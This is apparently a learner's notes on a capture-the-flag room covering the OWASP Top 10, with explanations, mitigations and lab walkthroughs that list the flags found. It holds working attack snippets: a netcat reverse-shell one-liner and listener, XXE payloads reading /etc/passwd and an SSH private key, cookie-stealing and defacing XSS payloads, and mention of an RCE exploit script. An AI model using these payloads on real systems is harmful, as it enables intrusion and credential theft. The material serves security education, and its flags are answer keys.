# The OWASP Top 10

This is a room which highlights the OWASP Top 10 as of a year ago (OWASP Data 2020). The headers go in the 1-10 order from least to most important to learn and fix (or in our case, the first ones to check for exploits for)

## Injection

Injection flaws are one of the most common vulns currently. It usually occurs due to a dev using user input directly instead of sanitizing data.

The most common types:

- SQL Injection is when user input is passed directly into a SQL query without sanitization, which can allow a user to see different information than the developer intended, like rows from tables and such
- Command Injection is slightly less popular, but involves when input is passed directly into a system, in which the said user could run system commands without even logging into a shell
  - Usually happens with PHP, Python, etc.
  - Blind command injection involves injecting code into a server but nothing is shown in the HTML document
  - Active command injection will return a result to the user

Not fixing this usually means any user would be able to access, modify, or delete any data they want given they are able to obtain information about what they injected (i.e. getting a list of tables and their columns in SQL or the `cwd` or `id` of the current user running the web app)

Fixes are usually pretty simple. A dev can do things like:

- fail a call if it contains characters which allow someone to inject
- use things like prepared statements so that input is taken in as a literal string and not part of a query/command
- sanitize inputs to escape characters which might be bad

[Interesting List of Reverse Shells - Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

Very simple reverse shell if it's supported: `;nc -e /bin/bash`

### Example

IP: 10.10.18.143

Scenario: EvilCorp has started development on a web based shell but has accidentally left it exposed to the Internet. It has some command injection vulns.

![evilshell.php](https://i.imgur.com/KcGizdo.png)

`passthru()` runs the command it's given and passes the output back to the browser. [php docs](https://www.php.net/manual/en/function.passthru.php)

<small>Also, fun PHP fact, PHP can't output stderr, but try blocks require a catch block to match</small>

In this case, since output is gonna be passed back to the browser, then it's can be used for active command injection.

I used [the first injection script here](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#php) to get into the machine

- What strange text file is in the website root directory? [`drpepper.txt`]
- How many non-root/non-service/non-daemon users are there? [_0_]
  - Looked through `/etc/passwd`
- What user is this app running as? [`www-data`]
  - Ran `whoami`
- What is the user's shell set as? [`/usr/sbin/nologin`]
  - Also had to look at the last entry for `www-data` in `/etc/passwd`
- What version of Ubuntu is running? [`18.04.4`]
  - Found using `hostnamectl`
  - Found here: https://www.cyberciti.biz/faq/how-to-check-os-version-in-linux-command-line/
- Print out the MOTD.  What favorite beverage is shown? [_Dr Pepper_]
  - Had to `cat /etc/update-motd.d/00-header`
  - Found here: https://devtidbits.com/2015/11/30/add-to-and-change-ubuntus-motd/

## Broken Authentication

Auth and session management are big parts of web apps. Authentication allows a user to access a web app by verifying their identity (usually with a username and password). If it's correct, then they get a session cookie unique to them, which keeps them logged in since HTTP is stateless. The server then can send the user data and keep track of them.

Flaws in this system can be exploited through:

- Brute force attacks: rapidly guessing random usernames and/or passwords until one matches
- Weak credentials: easy passwords, so easy that a brute force attack isn't required
- Weak session cookie: if the session cookie is predictable, then someone can make a fake one and access accounts

Mitigation techniques:

- A strong password policy (non-easy passwords, force them to use certain chars, block passwords on the top password list)
- Automatic lockout policy after a certain amount of failed attempts from a certain IP or machine
- Multi-Factor Auth (MFA), which would make the user supply a second code, usually from another auth app or a text message

### Example

IP: 10.10.183.69:8888

Commonly, a dev might forget to sanitize a username and/or password field, leaving it susceptible to SQL injection. Though, a dev might also try to fuzzy match on some authorization. i.e. the 'admin' user, which is valid, would get the same perms as a ' admin' user, which shouldn't be valid. (It won't always be the case [and tbh that's just bad checking, they should check on the admin user id or an admin OAuth role] but this could be one example to check for)

In this example, they ask us to try this by checking for a `darren` account. When it tells us the user exists, try to register ` darren` with a space in front and see if we can login

Steps I took:

- Tried to login as `darren:password`, failed.
- Tried to register as `darren`, was told the user already exists
- Tried to register as ` darren`, succeeded
- Tried logging in as the new ` darren:password`, succeeded
- Boom, on `darren`'s page

- What is the flag that you found in darren's account? [`fe86079416a21a3c99937fea8874b667`]
- Now try to do the same trick and see if you can login as arthur.
- What is the flag that you found in arthur's account? [`d9ac0f7db4fda460ac3edeb75d75e16e`]

## Sensitive Data Exposure

This is when a web app accidentally (or just neglectfully) gives out sensitive information. It usually refers to customers (i.e. names, dob's, financial info, etc.) but it can also mean usernames and passwords. On simple levels, it simply involves looking around or taking advantage of something within the app. On complex levels, it involves Man In The Middle attacks on the network, where an attacker forces user connections through a box they control, then taking advantage of weak encryption in order to get access to the interpreted info.

One example is through a web app using an insecure or flat-file database, like SQLite (possibly through a bad config between dev and prod environments, or maybe just a bad choice). If a SQLite DB is stored on the user of the webapp, it isn't a huge deal, but if it's under the root folder of the app, we might be able to download it, which would mean we would be able to view all the contents of it. `sqlite3` on Kali can interact with SQLite DBs. [Docs here](https://sqlite.org/cli.html#special_commands_to_sqlite3_dot_commands_).

Kali has some tools to crack passwords and such (like `john`), but this room is suggesting using a website called [Crackstation](https://crackstation.net/). There's a `john` room that I haven't been through, so I'm gonna use this website. It looks like the passwords will be MD5 hashes, so it's good for now, but I might wanna use `john` for different rooms.

### Example

IP: 10.10.238.56

- Have a look around the webapp. The developer has left themselves a note indicating that there is sensitive data in a specific directory.
  - Found it in the source of the `/login` page

```html
...
<div class=background></div>
<!-- Must remember to do something better with the database than store it in /assets... -->
<main>
...
```

- What is the name of the mentioned directory? [`/assets`]
- Navigate to the directory you found in question one. What file stands out as being likely to contain sensitive data? [`webapp.db`]
  - The file directory was open!
  - From here, I downloaded the SQLite DB (in `owasp_files` folder) and started looking through it
    - I could have used the SQL tools VSCode has but I used the CLI because I won't have VSCode all the time

```
└─$ sqlite3 webapp.db
SQLite version 3.34.1 2021-01-20 14:10:07
Enter ".help" for usage hints.
sqlite> .tables
sessions  users   
sqlite> PRAGMA table_info(users)
   ...> ;
0|userID|TEXT|1||1
1|username|TEXT|1||0
2|password|TEXT|1||0
3|admin|INT|1||0
sqlite> SELECT * FROM users;
4413096d9c933359b898b6202288a650|admin|6eea9b7ef19179a06954edd0f6c05ceb|1
23023b67a32488588db1e28579ced7ec|Bob|ad0234829205b9033196ba818f7a872b|1
4e8423b514eef575394ff78caed3254d|Alice|268b38ca7b84f44fa0a6cdc86e6301e0|0
sqlite> .exit
```

<small>PRAGMA command came from <a href="https://stackoverflow.com/a/948204">this S.O. answer</a></small>
<small>Looks like there are a bunch of ways to get that info as well, so PRAGMA was just the room suggestion</small>

- Use the supporting material to access the sensitive data. What is the password hash of the admin user? [`6eea9b7ef19179a06954edd0f6c05ceb`]
- Crack the hash. What is the admin's plaintext password? [`qwertyuiop`]
  - Used the Crackstation website

| Hash | Type | Result
|------|------|-------
|`6eea9b7ef19179a06954edd0f6c05ceb` | `md5` | `qwertyuiop`

- Login as the admin. What is the flag? [`THM{Yzc2YjdkMjE5N2VjMzNhOTE3NjdiMjdl}`]

## XML External Entity

XXE attacks a vuln that abuses features of XML parsers/data. It can allow an attacker to

- interact with any backend or external system that the app can access
- perform a Denial of Service (DoS or in h43rl33t: DDOS) attack
- perform server-side request forgery (SSRF) which allows the app to make requests to other apps
- enable port scanning and perform remote code execution

Two types of XXE attacks

- In-band: attacker gets an immediate response
- Out-of-band (aka blind XXE): no immediate response, response comes from a file, the attacker's server, etc.

XML is strict and has certain requirements

- Usually a XML Prolog is given at the beginning. Not required but good practice

```xml
<?xml version="1.0" encoding="UTF-8"?>
```

- A root element is required (i.e. one object which has all other fields under it)
- XML can have attributes, similar to HTML

```xml
<mail root="true">
   <to child="true">falcon</to>
   <from child="true">feast</from>
   <subject child="true">About XXE</subject>
   <text child="true">Teach about XXE</text>
</mail>
```

- XML is case sensitive

XML has a Document Type Definition (DTD) which defines the structure and legal elements/attributes of an XML document. It's essentially a schema which is used to validate an XML document.

```xml
<!DOCTYPE note 
[ 
<!ELEMENT note (to,from,heading,body)> 
<!ELEMENT to (#PCDATA)> 
<!ELEMENT from (#PCDATA)> 
<!ELEMENT heading (#PCDATA)> 
<!ELEMENT body (#PCDATA)> 
]>
```

In the above example:

- !DOCTYPE note: this means there should be a root element `<note></note>`
- !ELEMENT note: this means the root `<note>` should have the children `<to><from><heading><body>`
- !ELEMENT to/from/heading/body: for each child, it should be of type `#PCDATA` (aka parsable character data)

[Link to DTD on w3schools](https://www.w3schools.com/xml/xml_dtd_intro.asp)

We can use internal DTD to fool some systems into accepting certain XML docs blindly without checking it.

In DTD, there's a keyword within `!ENTITY` called `SYSTEM` which can be used to make a parser check a file on the system for the DTD, but this can be exploited possibly to print any file on the victim's box.

```
<!DOCTYPE root [
<!ENTITY read SYSTEM 'file:///etc/passwd'>
]>
<root>&read;</root>
...
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/...
```

<small><a href="https://portswigger.net/web-security/xxe/xml-entities">More info here from Burp Suite</a></small>

### XML Questions

- Full form of XML [_extensible markup language_]
- Is it compulsory to have XML prolog in XML documents? [_no_]
- Can we validate XML documents against a schema? [_yes_]
- How can we specify XML version and encoding in XML document? [_xml prolog_]

### DTD Questions

- How do you define a new ELEMENT? [`!ELEMENT`]
- How do you define a ROOT element? [`!DOCTYPE`]
- How do you define a new ENTITY? [`!ENTITY`]

### Example

- Try to display your own name using any payload.
  - I thought this one was trying to get `whoami` to work or something. It's just the test payload. Though I [found some cool info about getting remote code execution if it's running PHP](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing#remote-code-execution)

```xml
<!DOCTYPE replace [<!ENTITY name "Anomali"> ]>
 <userInfo>
  <firstName>Hello</firstName>
  <lastName>&name;</lastName>
 </userInfo>
```

- See if you can read the `/etc/passwd`

```
<!DOCTYPE root [
<!ENTITY read SYSTEM 'file:///etc/passwd'>
]>
<root>&read;</root>
...
root:x:0:0:root:/root:/bin/bash
...
```

- What is the name of the user in `/etc/passwd` [`falcon`]
  - The only user with `/bin/bash` in `/etc/passwd` that isn't `root`

```
...
falcon:x:1000:1000:falcon,,,:/home/falcon:/bin/bash
...
```

- Where is falcon's SSH key located? [`/home/falcon/.ssh/id_rsa`]
- What are the first 18 characters for falcon's private key [`MIIEogIBAAKCAQEA7`]

```
<!DOCTYPE root [
<!ENTITY read SYSTEM 'file:///home/falcon/.ssh/id_rsa'>
]>
<root>&read;</root>
...
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEA7...
...
```

## Broken Access Control

Some apps will have controls in place that allow only an admin or user to visit a certain page versus anyone else. Sometimes, configuration is broken or can be exploited to gain access to pages you aren't able to normally see, which means sensitive info can be leaked or certain operations can be run.

OWASP has a couple of examples:

1. The application uses unverified data in a SQL call that is accessing account information. In this case, an attacker can simply change the `acct` parameter to an admin account to see their info (i.e. `http://example.com/app/accountInfo?acct=notmyacct`)

```
pstmt.setString(1, request.getParameter("acct"));
ResultSet results = pstmt.executeQuery( );
```

2. An attacker simply force browses to target URLs. Admin rights are required for access to the admin page. If an unauthenticated user can access either of the pages below, or if a non-admin authenticated user can access the admin page, then there is a flaw.

```
http://example.com/app/getappInfo
...
http://example.com/app/admin_getappInfo
```

Insecure Direct Object Reference (IDOR) is the act of exploiting a misconfiguration in a web app in the way that user input is handled, specifically to access resources you shouldn't have access to.

An example: when logging into a bank account, after authentication, we're taken to a ` https://example.com/bank?account_number=1234` page, which has our bank account details. An attacker may be able to gain access to another account if they change the `account_number` query param.

[More info about IDOR](https://portswigger.net/web-security/access-control/idor)

### Example

- Login with the username being `noot` and the password `test1234`.
- Look at other users notes. What is the flag? [`flag{fivefourthree}`]
  - At first, I actually got to use Burp Suite's Intruder with a Number Payload set. Then I decided to manually check `?note=0` and sure as shit the flag is there lol

## Security Misconfiguration

Security Misconfigurations are fairly simple, it's when security settings aren't set or are misconfigured (go figure...).

Examples:

- Bad perms for an AWS S3 bucket
- Having unnecessary features enabled
- Using default accounts for a service (like a CMS)
- Error messages with too much detail
- Not using [HTTP security headers](https://owasp.org/www-project-secure-headers/) or giving too many details

This one usually gives way to another OWASP Top 10 vuln., like XXE, XSS, or Injection.

[OWASP page on it](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A6-Security_Misconfiguration)

### Examples

- Hack into it. What's the flag? [`thm{4b9513968fd564a87b28aa1f9d672e17}`]
  - Fuck, this one was a doozy...
  - I looked at this for a long ass while. I first tried going through Burp Suite's Intruder and a default user/pass list, though none of them worked. I then looked at like EVERY file on the server, no dice. I was able to bypass the cookie check and get onto the page, but no info came up.
  - I eventually looked at another writeup, and I felt glad they also hit a wall like I did lol.
  - The hint mentions looking at the source code, which means it might be in some repo somewhere. Low and behold, [this repo](https://github.com/NinjaJc01/PensiveNotes) came up in the search, and at the bottom of the README was a set of default credentials. And they worked...
  - 🖕

## Cross-site Scripting

Cross-Site Scripting (XSS) is a vuln. in web apps that allows an attacker to run malicious scripts on a victim's machine. An app is vulnerable if it uses unsantized input, and is possible through many langs (JS, VBScript, Flash, CSS, etc.)

Main types:

- Stored XSS - (the most dangerous one) when the string originates from a database. Happens usually when user input to a db is not sanitized
- Reflected XSS - the malicious payload is part of a victim's request on the website. The site includes the payload in the response back to the user (i.e. an attacker has the victim click a link)
- DOM-based XSS - (DOM - Document Object Model (for HTML/XML)) represents the page so that programs can change the document structure, style, and content.

THM has a XSS room, might be worth looking at.

Common payloads (in JS):

- Popups (using `<script>alert("Hello!");</script>`)
- Writing extra HTML (`<script>document.write(htmlString)</script>`) - defaces the page
- Keyloggers ([examples](http://www.xss-payloads.com/payloads-list.html?c#category=capture)) - log the keystrokes of a user, usually used for when a user types a username/password
- Port scanner ([examples](http://www.xss-payloads.com/payloads-list.html?s#category=system)) - scans open ports on the system

JS can be very powerful, and XSS can cause a victim to have a lot about them leaked, even pictures from their webcam.

The examples I have written have a shit ton more payloads to use if needed

### Example

- Navigate to the site in your browser and click on the "Reflected XSS" tab on the navbar; craft a reflected XSS payload that will cause a popup saying "Hello". [`ThereIsMoreToXSSThanYouThink`]

```html
---FROM PAGE---

...
</details>
<hr>
<h6>You searched for: **hello**</h6>
...

--- PAYLOAD ---

hello</h6><script>alert("Hello")</script>

--- AFTER PAYLOAD ---
...
</details>
<hr>
<h6>You searched for: hello</h6><script>alert("Hello")</script></h6>
...
```

- On the same reflective page, craft a reflected XSS payload that will cause a popup with your machines IP address. [`ReflectiveXss4TheWin`]
  - I originally went to a [free API](https://www.my-ip.io/api) that fetches the IP, but they wanted the network one, not the public one. The hint suggested `window.location.hostname`, though in actual practice the public one might be more useful

```html
</h6><script>alert(window.location.hostname)</script>
```

- Now navigate to the site in your browser and click on the "Stored XSS" tab on the navbar; make an account <small>(they didn't mention it but you'll probably need to refresh the page)</small>. Then add a comment and see if you can insert some of your own HTML. [`HTML_T4gs`]

```html
<h2>hi</h2>
```

- On the same page, create an alert popup box appear on the page with your document cookies. [`W3LL_D0N3_LVL2`]

```html
<script>alert(document.cookie)</script>
```

- Change "XSS Playground" to "I am a hacker" by adding a comment and using Javascript. [`websites_can_be_easily_defaced_with_xss`]

```html
<script>document.getElementById("thm-title").textContent="I am a hacker"</script>
```

## Insecure Deserialization

A very broad topic, Insecure Deserialization is a vuln. which occurs when untrusted data is used to abuse the logic of an app. It essentially is replacing data processed by an app with malicious code, which allows anything from Remote Code Execution to DDOS attacks.

It's lower on the list because it usually is only good on a case-by-case basis (no reliable tool to exploit it) and you have to be a real l33t person to really exploit it well. The value of the data exposed is also a factor.

Any app with no or not enough validation/integrity checks apply, such as E-Commerce Sites, APIs, Forums, or App Runtimes (like tomcat, Jenkins, etc.)

The next sections go over programming logic and such. Gonna skip writing about some of the questions as they seem easy and not really needed for my notes

Objects - part of Object Oriented Programming, objects contain state (variables) and behavior (functions/conditions); helps save writing the same code over and over

Serialization - the process of converting objects used in programming to simpler formats (like to JSON, XML, YAML, text, etc.)

Deserialization - when you go through and interpret serialized info back into an object

Example: using cookies to store passwords

Cookie structure:

- Name: the name of the cookie to be set
- Value: the value of the cookie, either in plain text or encoded
- Secure Only (_optional_): If true, the cookie will only be set over HTTPS
- Expiry (_optional_): Timestamp of how long the cookie will stay in the browser
- Path (_optional_): If set, the cookie will only be sent if the URL path is given

### Knowledge Check

Both of these were Google research questions

- Who developed Tomcat? [_The Apache Software Foundation_]
- What type of attack that crashes services can be performed with insecure deserialization? [_Denial of Service_]
  - Hint was `DoS attack`

### Cookie Example

IP: 10.10.103.209
Check the cookies

- 1st flag (cookie value) [`THM{good_old_base64_huh}`]
  - `sessionId` was a base64 encoded string, I decoded it using Cyberchef
- 2nd flag (admin dashboard) [``]
  - Changed the `userType` cookie to `admin` then went to `http://10.10.103.209/admin`

### Remote Code Execution Example

- What's the flag? [`4a69a7ff9fd68`]
  - This one is a bit hard pressed for a hacker going in blind but this one is actually pretty cool!
  - Changed the cookie's `userType` back to `user` and went back to the `myprofile` page
  - Click on the `vim` link, it gives us an encoded cookie
  - Click on the `feedback` link
  - It is now revealed to us that the `vim` link base64 encodes a json string from Python, and that the `feedback` link just basically decodes it and uses it
  - It is then revealed to us again that the input can be directly used, meaning we can use a reverse shell to go into it
  - Opened netcat: `nc -lvnp 4444`
  - Was given a [reverse shell generation script for python](./owasp_files/rce.py), which essentially is just base64 encoding a json string with the reverse shell script
  - Ran the script and replaced the cookie with the new base64 we made
  - Boom, we're in!
  - Found the flag file and printed it out

## Components with Known Vulnerabilities

Basically, just seeing if the app has something on `exploit-db` or has some other vuln.

OWASP ranks it as a high severity because companies tend to miss updates for software, so the severity level hopefully persuades companies more to keep up with updated software.

### Example

- What's the character count of `/etc/passwd`? (`wc -c /etc/passwd`) [`1611`]

Steps I did:

- Went to the IP: 10.10.188.166
- The webpage is in PHP, but there's no immediate telltale about what it's running. It links to a group's website but it doesn't look like it has any premade CMS stuff, at least nothing obvious
- [Ran a nmap scan](./owasp_files/nmap_known_vulns.log) but it didn't tell much either
- Ran `searchsploit projectworlds`, nothing...
- It COULD be Wordpress but there's no telltale of that so far
- AHA! `searchsploit cse bookstore` (the name of the site) brought up some interesting things! 3 to be exact...

```
CSE Bookstore 1.0 - 'quantity' Persistent Cross-site Scripting
CSE Bookstore 1.0 - Authentication Bypass
CSE Bookstore 1.0 - Multiple SQL Injection
```

...
...
...
...

- It is now a few hours, dinner, a walk, and a green tea later and I now want to punch my monitor
- I first tried mucking around with SQL injection, and there was a bit of traction, but with the way the data is handled on the pages, it was gonna make it REALLY hard to try to do things like dumping hashes
- I then saw the quantity XSS exploit, and I struggled a bunch, but I got REALLY close. I got a shell connection (kind of) using [this script on Github](https://github.com/shelld3v/JSshell) (after the one on xss-payloads would not cooperate), but it wouldn't listen to any of my commands
- I bit the bullet and looked at the walkthrough I was looking at earlier...and...wow
- It was under ANOTHER FUCKING NAME. JUST `ONLINE BOOK STORE`. WHAT
- HOW IN THE GOD DAMN SHIT. THERE ARE SO MANY BOOKSTORES OUT ON THE WEB. SO MANY. AT LEAST SEVERAL. AND THAT'S THE ONE?
- THIS IS LEGIT THE NAME: `Online Book Store 1.0 - Unauthenticated Remote Code Execution`
- HOW IN THE FUCK DO I JUST ASSUME IT'S THAT ONE, I SEARCHED SPECIFICALLY FOR CSE AND PROJECTWORLDS. YOUR ASS COULDN'T BE BOTHERED TO JUST ADD `CSE` AT THE BEGINNING
- AAAAAAAAAAAAAAAAAAAAAAAAAAA
- Whatever...[I ran the script](./owasp_files/47887.py) in there and it worked and I got the word count...
- Asshole should have, I don't know, PUT MORE FUCKING DETAILS IN THE GODDAMN TITLE. WOULD HAVE SOLVED THIS SHIT HOURS AGO
- Rant over, next section

## Insufficient Logging & Monitoring

Logging is an app standard (or at least should be). It helps developers and others understand what's going on with an application, and tools like Splunk can be used to aggregate logs and such to create a lot of useful data. Logging, in this case, is good to see an attacker's actions. The lack thereof can result in:

- regulatory damage: loss of user data or other sensitive info can result in a lot of fines and penalties depending on the country you're in or operate in
- risk of further attacks: an attacker may go in again, and each time get more access, exploits, and data than the previous time

Logs should at least store the following when applicable:

- HTTP status codes
- timestamps
- usernames
- api endpoint/page locations
- IPs

Since some of this info is sensitive, logs should be stored securely and backups should be made and maintained.

After an incident, logging becomes more important. Monitoring logs can be a big part in detecting suspicious activity, such as:

- multiple un-auth-ed attempts on certain pages
- requests from IPs that don't make sense
- use of automated tools (like Burp Suite)
- common payloads like XSS

Certain findings are more important than others, and it's good to be able to differentiate and prioritize which incidents or activities are more important to address

### Example

[log file](./owasp_files/login-logs.txt)

- What IP address is the attacker using? [`49.99.13.16`]
  - Only IP with 4 consistent auth fails
- What kind of attack is being carried out? [_brute force_]
  - Trying multiple different possible admin users with passwords

## Extra Info

.
